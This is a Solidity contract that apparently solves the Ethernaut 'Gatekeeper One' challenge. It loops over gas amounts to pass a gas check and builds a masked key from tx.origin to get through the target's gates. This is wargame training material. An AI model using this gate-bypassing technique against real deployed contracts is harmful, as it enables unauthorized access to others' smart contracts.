// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./interfaces/13_IGatekeeperOne.sol";

address constant INSTANCE = 0xB2f55223312353B9B47d960d6Fb4DbdbA26a8b68;

contract GatekeeperOneSolution {
    IGatekeeperOne instance = IGatekeeperOne(INSTANCE);

    function solve() external {
        for (uint256 i = 0; i < 1000; i++) {
            try instance.enter{gas: 3 * 8191 + i}(bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)) returns(bool) {
                return;
            } catch {
                continue;
            }
        }
    }
}